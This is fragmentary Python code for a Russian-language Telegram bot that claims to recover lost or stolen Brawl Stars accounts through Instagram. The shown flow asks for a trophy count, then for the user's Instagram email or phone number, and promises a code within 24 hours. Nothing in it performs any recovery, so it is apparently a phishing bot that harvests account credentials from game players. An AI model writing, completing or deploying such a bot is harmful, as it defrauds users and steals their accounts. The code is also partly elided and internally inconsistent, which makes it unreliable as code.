...
ID: {{message.from_user.id}}''')
	bot.send_message(message.chat.id, '''👋 Привет! 👋
		Этот бот находит потерянные\украденные аккаунты Brawl Stars по сети Instagram.
		Чтобы начать, нажмите /begin''') 
...
@bot.message_handler(commands=['begin', 'n'])
def start1(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="Восстановить аккаунт", callback_data="like")
	second_button = types.InlineKeyboardButton(text="Подробнее", callback_data="sub")
...
def callback_inline1(call):
	if call.data == "like":
		msg = bot.send_message(call.message.chat.id, 'Введите примерное кол-во кубков (разброс - 1000)') 
		bot.register_next_step_handler(msg, qproc1)

	elif call.data == "sub":
		msg = bot.send_message(call.message.chat.id, 'Этот бот ищет аккаунты по привязанным и\или упомянутым в аккаунте странице Instagram. Код для входа будет привязан к Вашей странице. Введите примерное кол-во кубков (разброс - 1000)') 
...
def qproc1(message):
	try:
		num = message.text	
		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите количество числом! Повторите попытку, написав /begin!')#⏳
			return
		elif int(num) > 1000000000:
			bot.reply_to(message, 'Колличество кубков не может быть более 100000000!')
			return
		else:
			bot.send_message(message.chat.id, f'Колличество кубков: {{num}}')
			msg = bot.send_message(message.chat.id, 'Введите почту(или номер телефона) от вашего аккаунта Instagram:') 
...
def qproc2(message):
	try:
		num = message.text
		if not num.isdigit():
			bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /begin!')#⏳
			return
		elif int(num) > 100000000000000:
			bot.reply_to(message, 'Колличество кубков не может быть более 100000000000000!')
			return
		else:
			bot.send_message(message.chat.id, f'Колличество кубков: {{num}}')
...
'''
	...
	time.sleep(1)
	bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, ожидайте код на ваш аккаунт в течении 24 часов!')
